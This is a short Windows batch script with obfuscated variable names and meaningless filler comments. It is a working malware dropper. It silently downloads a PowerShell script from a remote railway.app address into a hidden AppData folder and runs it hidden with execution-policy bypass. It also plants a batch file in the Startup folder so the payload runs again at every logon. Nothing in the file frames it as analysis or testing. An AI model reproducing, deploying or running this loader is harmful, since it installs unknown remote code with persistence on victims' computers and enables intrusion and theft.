@echo off
REM Ver390
setlocal EnableDelayedExpansion
REM Ver502
REM Mod989

REM [9880fcd95d0243710beebfd84006f1f7]

set "9d939701=%LOCALAPPDATA%\318e6436e1"
set "6f136f1d=https://web-production-9d7cc.up.railway.app/client.ps1"
set "3ef1db74=%9d939701%\da210ea146.ps1"

REM Proc336
if not exist "%9d939701%" mkdir "%9d939701%"

REM Sys115
powershell -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%6f136f1d%','%3ef1db74%');Start-Process powershell -ArgumentList '-w hidden -ep bypass -f \"%3ef1db74%\"' -WindowStyle Hidden"

REM Core560
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%startup%\61ab53.bat" (
    echo @echo off> "%startup%\61ab53.bat"
    echo powershell -w hidden -ep bypass -f "%3ef1db74%">> "%startup%\61ab53.bat"
)

REM Core106
exit /b 0

REM [837A3C7CDF359337EC65418B]
